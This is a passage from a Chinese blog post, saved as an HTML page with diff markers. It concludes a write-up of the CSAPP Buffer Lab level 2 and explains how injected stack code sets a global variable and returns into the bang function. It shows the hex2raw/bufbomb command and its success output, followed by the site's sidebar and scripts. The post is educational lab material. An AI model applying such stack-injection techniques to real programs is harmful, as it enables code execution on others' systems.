+<p>我们很巧妙的把pc指向了我们设置的攻击代码处，然后开始执行我们设置的代码，当指行完 <code>add    $0x10,%esp</code>的时候，内存空间是这样的：</p>
+<p><img src="/images/CSAPP-BufferLab-05.png" alt="level-2"></p>
+<p>然后执行<code>ret</code>，把栈顶的bang函数的首地址弹出给pc，在改变全局变量的值后，顺利地跳转到bang函数开始执行。</p>
+<p>下面我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level2.txt | ./hex2raw | ./bufbomb -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Bang!: You set global_value to 0x52f8c747</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/深入理解计算机系统/">深入理解计算机系统|</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/深入理解计算机系统/">深入理解计算机系统|</a>
+  </div>
+
+</div>
+
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2018/05/11/Linux-Linux命令小抄/"  title="Linux|Linux命令小抄">
+ <span>Linux|Linux命令小抄
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+<div id="authorInfo">
+	
+		<div class="author-img"></div>		
+	
+	<div class="social-info" class="clearfix">
+		
+		
+		<a href="https://github.com/wuduozhi" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:1220555415@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+
+	</div>
+</div>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/DataStruct/" title="DataStruct">DataStruct<sup>4</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Java/" title="Java">Java<sup>16</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/LeetCode/" title="LeetCode">LeetCode<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/PHP/" title="PHP">PHP<sup>12</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Web安全/" title="Web安全">Web安全<sup>4</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/college/" title="college">college<sup>12</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/python/" title="python">python<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/工具/" title="工具">工具<sup>10</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/干货/" title="干货">干货<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/操作系统/" title="操作系统">操作系统<sup>4</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/数据库/" title="数据库">数据库<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/machine/" title="机器学习">机器学习<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/架构/" title="架构">架构<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/深入理解计算机系统/" title="深入理解计算机系统">深入理解计算机系统<sup>11</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/深入理解计算机系统/" title="深入理解计算机系统|">深入理解计算机系统|<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/爬虫/" title="爬虫">爬虫<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/计算机算法/" title="计算机算法">计算机算法<sup>6</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/计算机网络/" title="计算机网络">计算机网络<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/读书笔记/" title="读书笔记">读书笔记<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/运维/" title="运维">运维<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/面试/" title="面试">面试<sup>3</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/Java/" title="Java">Java<sup>15</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/PHP/" title="PHP">PHP<sup>13</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/college/" title="college">college<sup>12</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/深入理解计算机系统/" title="深入理解计算机系统">深入理解计算机系统<sup>11</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/工具/" title="工具">工具<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/数据结构/" title="数据结构">数据结构<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/计算机算法/" title="计算机算法">计算机算法<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/操作系统/" title="操作系统">操作系统<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/python/" title="python">python<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/机器学习/" title="机器学习">机器学习<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Web安全/" title="Web安全">Web安全<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/爬虫/" title="爬虫">爬虫<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/面试/" title="面试">面试<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/LeetCode/" title="LeetCode">LeetCode<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/干货/" title="干货">干货<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/运维/" title="运维">运维<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Linux/" title="Linux">Linux<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/数据库/" title="数据库">数据库<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Octave/" title="Octave">Octave<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/多线程/" title="多线程">多线程<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+		
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/hsihohuang/kiddochan" target="_blank" title="Kiddochan">Kiddochan</a> © 2018 
+		
+		<a href="/about" target="_blank" title="wuduozhi">wuduozhi</a>
+		
+		
+		</p>
+</div>
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End --><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+  </body>
+</html>
